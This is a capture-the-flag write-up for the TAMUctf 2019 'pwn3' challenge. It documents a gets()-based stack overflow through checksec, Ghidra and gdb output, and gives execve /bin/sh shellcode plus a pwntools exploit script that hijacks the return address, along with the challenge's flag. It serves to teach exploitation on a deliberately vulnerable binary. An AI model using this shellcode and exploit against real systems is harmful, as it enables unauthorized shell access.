# Pwn3 - TAMUctf 2019
Category: Pwn, Difficulty: easy

## Description

*nc pwn.tamuctf.com 4323*

And attached file [pwn3](pwn3)

## Pwn3 Solution

Let's get information about attached file ```pwn3``` using ```checksec```:
```console
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $ checksec pwn3
[*] '/home/evyatar/Desktop/nightmare/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

So we can see it's 32bit with [PIE enabled](https://en.wikipedia.org/wiki/Position-independent_code) , [NX disabled](https://en.wikipedia.org/wiki/NX_bit).

It's mean we can run our shell code from stack (NX disabled) but because PIE enabled (like ASLR) - We need to find the offset between the buffer to rip.

Run the binary:

```console
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $ ./pwn3
Take this, you might need it on your journey 0xffe744de!
AAAA
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $ ./pwn3
Take this, you might need it on your journey 0xfff5aeae!
BBBB
```

Since we have ```PIE enabled``` we get diffrent addresses, First run with ```0xffe744de``` and second run with ```0xfff5aeae```.

The binary ask for user input.

Let's observe the ```main``` function from attached file ```pwn3``` using Ghidra:
```c
undefined4 main(undefined1 param_1)

{
  setvbuf(stdout,(char *)0x2,0,0);
  echo();
  return 0;
}
```

So we can see the ```main``` function called to ```echo()```:
```c
void echo(void)

{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

```echo``` function print the message with address of ```local_12e``` buffer and then use ```gets``` function.

Since ```gets``` doesn't restrict how much data it scans in, we get an overflow. With this we can overwrite the return address and get code execution.

So let's check what is the offset between the buffer ```local_12e``` to ```eip``` using ```gdb```.

I just set break point in ```echo``` function right after the ```gets``` function called:
```asm
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $ gdb ./pwn3 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
89 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./pwn3...(no debugging symbols found)...done.
gef➤  disassemble echo
Dump of assembler code for function echo:
   0x0000059d <+0>:	push   ebp
   0x0000059e <+1>:	mov    ebp,esp
   0x000005a0 <+3>:	push   ebx
   0x000005a1 <+4>:	sub    esp,0x134
   0x000005a7 <+10>:	call   0x4a0 <__x86.get_pc_thunk.bx>
   0x000005ac <+15>:	add    ebx,0x1a20
   0x000005b2 <+21>:	sub    esp,0x8
   0x000005b5 <+24>:	lea    eax,[ebp-0x12a]
   0x000005bb <+30>:	push   eax
   0x000005bc <+31>:	lea    eax,[ebx-0x191c]
   0x000005c2 <+37>:	push   eax
   0x000005c3 <+38>:	call   0x410 <printf@plt>
   0x000005c8 <+43>:	add    esp,0x10
   0x000005cb <+46>:	sub    esp,0xc
   0x000005ce <+49>:	lea    eax,[ebp-0x12a]
   0x000005d4 <+55>:	push   eax
   0x000005d5 <+56>:	call   0x420 <gets@plt>
   0x000005da <+61>:	add    esp,0x10
   0x000005dd <+64>:	nop
   0x000005de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000005e1 <+68>:	leave  
   0x000005e2 <+69>:	ret    
End of assembler dump.
gef➤  b *echo+61
Breakpoint 1 at 0x5da
gef➤ 

```

Now, Let's run the binary with input ```AAAAAAAA``` and then we can find the offset between the buffer to ```eip``` register:
```asm
gef➤  r
Starting program: /home/evyatar/Desktop/nightmare/pwn3 
Take this, you might need it on your journey 0xffffcfbe!
AAAAAAAA

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcfbe  →  "AAAAAAAA"
$ebx   : 0x56556fcc  →  <_GLOBAL_OFFSET_TABLE_+0> aam 0x1e
$ecx   : 0xf7fb55c0  →  0xfbad2288
$edx   : 0xf7fb689c  →  0x00000000
$esp   : 0xffffcfa0  →  0xffffcfbe  →  "AAAAAAAA"
$ebp   : 0xffffd0e8  →  0xffffd0f8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001d4d8c
$edi   : 0x0       
$eip   : 0x565555da  →  <echo+61> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfa0│+0x0000: 0xffffcfbe  →  "AAAAAAAA"	 ← $esp
0xffffcfa4│+0x0004: 0xffffcfbe  →  "AAAAAAAA"
0xffffcfa8│+0x0008: 0xffffcfcc  →  0x00000000
0xffffcfac│+0x000c: 0x565555ac  →  <echo+15> add ebx, 0x1a20
0xffffcfb0│+0x0010: 0x00000000
0xffffcfb4│+0x0014: 0x00000000
0xffffcfb8│+0x0018: 0x00000000
0xffffcfbc│+0x001c: 0x41410000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565555ce <echo+49>        lea    eax, [ebp-0x12a]
   0x565555d4 <echo+55>        push   eax
   0x565555d5 <echo+56>        call   0x56555420 <gets@plt>
 → 0x565555da <echo+61>        add    esp, 0x10
   0x565555dd <echo+64>        nop    
   0x565555de <echo+65>        mov    ebx, DWORD PTR [ebp-0x4]
   0x565555e1 <echo+68>        leave  
   0x565555e2 <echo+69>        ret    
   0x565555e3 <main+0>         lea    ecx, [esp+0x4]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn3", stopped 0x565555da in echo (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565555da → echo()
[#1] 0x5655561a → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x565555da in echo ()
gef➤  search-pattern AAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rwx
  0x56558160 - 0x5655816a  →   "AAAAAAAA\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffcfbe - 0xffffcfc6  →   "AAAAAAAA" 
gef➤  

```

So we can see the buffer on stack start from ```0xffffcfbe``` address, Let's find the ```eip``` address using ```info frame```:
```asm
gef➤  info frame
Stack level 0, frame at 0xffffd0f0:
 eip = 0x565555da in echo; saved eip = 0x5655561a
 called by frame at 0xffffd110
 Arglist at 0xffffd0e8, args: 
 Locals at 0xffffd0e8, Previous frame's sp is 0xffffd0f0
 Saved registers:
  ebx at 0xffffd0e4, ebp at 0xffffd0e8, eip at 0xffffd0ec
gef➤ 
```

So ```eip``` on ```0xffffd0ec``` so the offset is ```0xffffd0ec-0xffffcfbe=0x12e```.

It's mean we need to fill ```0x12e``` bytes to override the return address on ```eip``` register to run our shell code.

We can get shell code from [http://shell-storm.org/shellcode/files/shellcode-827.php](http://shell-storm.org/shellcode/files/shellcode-827.php):

```c
    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
```

Now, Let's write code:
1. Fill the buffer with shell code and padding
2. Override the return address with the address of our buffer to make shell code run.

```python
from pwn import *

shell= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p = process('./pwn3')
data=p.recvuntil("!")
print(data)
address=int(data.split(' ')[-1].replace('!',''),16) # Get the buffer address 

print(address)
payload=shell + "A"*(0x12E-len(shell))+p32(address)
p.send(payload)
p.interactive()

```

Run it:
```console
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $ python pwn3.py 
[+] Starting local process './pwn3': pid 23023
Take this, you might need it on your journey 0xff8af73e!
4287297342
[*] Switching to interactive mode

$ whoami
evyatar
$  

```

And we get our shell code running.

Let's run it against the server ```nc pwn.tamuctf.com 4323``` to get the flag (Change from ```p = process('./pwn3')``` to ```p = remote('pwn.tamuctf.com', 4323)```
```console
┌─[evyatar@parrot]─[/media/shared/ctf/TAMUctf/pwn3]
└──╼ $
[+] Starting
[+] Opening connection to pwn.tamuctf.com on port 4323: Done
Take this, you might need it on your journey 0xff8af73e!
4287297342
[*] Switching to interactive mode
$ ls
flag.txt
pwn3
$ cat flag.txt
gigem{r3m073_fl46_3x3cu710n}
````

Flag: ```gigem{r3m073_fl46_3x3cu710n}```.